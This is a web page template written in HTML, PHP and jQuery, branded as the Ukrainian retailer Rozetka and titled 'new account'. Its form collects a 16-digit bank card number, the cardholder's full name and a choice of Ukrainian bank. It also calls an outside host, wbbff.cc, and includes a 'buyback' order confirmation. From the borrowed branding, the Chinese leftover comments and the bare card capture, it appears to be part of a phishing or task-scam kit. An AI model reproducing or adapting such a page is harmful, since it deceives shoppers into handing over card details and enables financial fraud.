<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="pixel-ratio-2 retina"><head><style>:root {

--image-path: url('<?php echo asset("/assets/foot_nav.png")?>');
--image-path2: url('<?php echo asset("/assets/dd_icon.png")?>');
}</style>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<title>новий аккаунт - Rozetka</title>
<meta name="keywords" content="Платформа зворотного викупу для російських торговців">
<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
<meta name="format-detection" content="telephone=no">
<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css")?>">
<script type="text/javascript" src="<?php echo asset("assets/jquery.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/global.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/arttpl.js")?>"></script>
<link href="<?php echo asset("assets/layer.css")?>" type="text/css" rel="styleSheet" id="layermcss"></head>
<body style="overflow-y: auto;"><div class="pagetop">
	<div class="fh"><a href="<?php echo route("payment.methods") ?>"></a></div>
	<div>новий аккаунт</div>
		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
	<!-- 
<div class="top_menu" id="top_menu">
	<ul>
	<li><a href="<?php  echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
	<li><a href="<?php  echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
	<li><a href="<?php  echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
	</ul>
	<div class="clear"></div>
</div> --></div>
<form method="post" id="form">
	@csrf
	<input type="hidden" name="user_id" value="{{ Auth::user()->id }}">
	
<div class="main">
	<div class="zc_box2">
		<div class="zc_list">
			<div class="zc_name">Банк</div>
			<div class="zc_text" id="userbank_type_show" onclick="app_page('page_userbank_type')">інші</div>
			<i class="jt_r"></i>
		</div>
<!-- 		<div class="zc_list" id="userbank_address">
			<div class="zc_name">开户行</div>
			<div class="zc_text"><input type="text" name="userbank_address" class="zc_input1" value="" placeholder="" /></div>
		</div> -->
		<div class="zc_list">
			<div class="zc_name">Картка</div>
			<div class="zc_text"><input type="text" name="card" class="zc_input1" maxlength="16" size="16" placeholder="введіть картку"></div>
		</div>
		<div class="zc_list">
			<div class="zc_name">ПІБ</div>
			<div class="zc_text"><input type="text" name="name" class="zc_input1" placeholder="введіть повне ім'я"></div>
		</div>
	</div>
	<div class="loginbtn" style="margin:20px 10px;">
		<input type="hidden" name="pe_token" value="75236c7c5fdf7ebfe3441c02863d0cb8">
		<input type="hidden" name="pesubmit">	
		<input type="button" value="Додати">
	</div>
</div>
<div id="page_userbank_type" class="divhide">
	<div class="add_tt">Виберіть назву банку</div>
	<div class="close_btn" onclick="app_page_close();"></div>
	<div>
				<label class="add_sel js_radio sel" for="userbank_type_банк">
			<input type="radio" name="userbank_type" value="банк" userbank_name="інші" id="userbank_type_банк" class="divhide" checked="checked">
			<div class="fl mat2">інші</div>
			<div class="dui"></div>
			<div class="clear"></div>
		</label>
				<label class="add_sel js_radio" for="userbank_type_Монобанк">
			<input type="radio" name="userbank_type" value="Монобанк" userbank_name="Монобанк" id="userbank_type_Монобанк" class="divhide">
			<div class="fl mat2">Монобанк</div>
			<div class="dui"></div>
			<div class="clear"></div>
		</label>
				<label class="add_sel js_radio" for="userbank_type_ПриватБанк">
			<input type="radio" name="userbank_type" value="ПриватБанк" userbank_name="ПриватБанк" id="userbank_type_ПриватБанк" class="divhide">
			<div class="fl mat2">ПриватБанк</div>
			<div class="dui"></div>
			<div class="clear"></div>
		</label>
				<label class="add_sel js_radio" for="userbank_type_Інший банк">
			<input type="radio" name="userbank_type" value="Інший банк" userbank_name="Інший банк" id="userbank_type_Інший банк" class="divhide">
			<div class="fl mat2">Інший банк</div>
			<div class="dui"></div>
			<div class="clear"></div>
		</label>
			</div>
</div>
</form>
<script type="text/javascript">
$(function(){
	/*js_bankselect();
	$(":input[name='userbank_type']").change(function(){
		js_bankselect();
	});*/
	pe_select_radio('userbank_type', $(":input[name='userbank_type']:eq(0)").val(), function(json){
		$("#userbank_type_show").html($(":input[name='userbank_type']:checked").attr("userbank_name"));
		js_bankselect();
		app_page_close();
	});

	$(":input[name='userbank_num']").on('blur',function(){
		var userbank_num = $(this).val();
		userbank_num = userbank_num.replace(/[-,+]|(\s*)/g,'');
		$(this).val(userbank_num);
	});	

	$(":button").click(function(){
		var userbank_type = $(":input[name='userbank_type']:checked").val();
		// if (userbank_type != 'alipay' && userbank_type != 'tenpay' && $(":input[name='userbank_address']").val() == '') {
		// 	app_tip("请填写开户行");
		// 	return false;
		// }
		if ($(":input[name='card']").val().length != 16) {
			app_tip("Номер картки повинен складатися з 16 цифр");
			return false;
		}
		if ($(":input[name='name']").val() == '') {
			app_tip("Будь ласка, заповніть повне ім'я власника картки.");
			return false;
		}
		app_submit("<?php echo route("api.payments.add")?>", function(json){
			console.log(json)
			if (json.success == true) {
				if ('') {
					app_open("<?php echo route("payment.methods") ?>", 1000);				
				}
				else {
					app_open("back", 1000);				
				}
			}
		})
	})
})
function js_bankselect() {
	var userbank_type = $(":input[name='userbank_type']:checked").val();
	if (userbank_type == 'alipay' || userbank_type == 'wechat') {
		$("#userbank_address").hide().find(":input").attr("disabled", "disabled");
	}
	else {
		$("#userbank_address").show().find(":input").removeAttr("disabled");
	}
}
</script>
<link rel="stylesheet" href="<?php echo asset("assets/weui.min.css")?>">
<link rel="stylesheet" href="<?php echo asset("assets/jquery-weui.min.css")?>">
<script src="<?php echo asset("assets/jquery-weui.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/layer.js")?>"></script>
<script type="text/javascript" src="<?php echo asset("assets/app.js")?>"></script>
<script type="text/javascript">
//верхнє меню клік
function top_menu() {
	if ($("#top_menu").is(":hidden")) {
		$("#top_menu").show();
	}
	else {
		$("#top_menu").hide();	
	}
	$("#top_menu a").live("click", function(){
		$("#top_menu").hide();
	})
}
pe_loadscript("https://wbbff.cc/api.php?mod=cron");
</script>
<script>
function confirm_huigou(order_id){
    layer.open({
		content: "Визначити викуп цього Замовлення？",
		btn: ["OK", "Скасувати"],
		shadeClose: false,
		yes: function() {
		    
			/*layer.open({
				content: '你点了确认',
				time: 1
			});*/
			$.ajax({
                type:"POST",
                url:"./user.php?mod=order&act=huigou_do",
                dataType:"json",
                data:{
                    'order_id':order_id,
                },
                success:function(res){
                    console.log(res);

                    if (res.result == false) {
	                    layer.open({
	    						content: res.msg,
	    						time: 3,
	    						skin: 'msg',
	    						end: function () { 
								location.href='./user.php?mod=userbank';
	    						}
	    					});
                    }else{
	                    layer.open({
	    						content: res.msg,
	    						time: 2,
	    						skin: 'msg',
	    						end: function () { 
									location.reload();
	    						}
	    					});
                    }
                }
            });
		}

	});
}    
</script>

</body></html>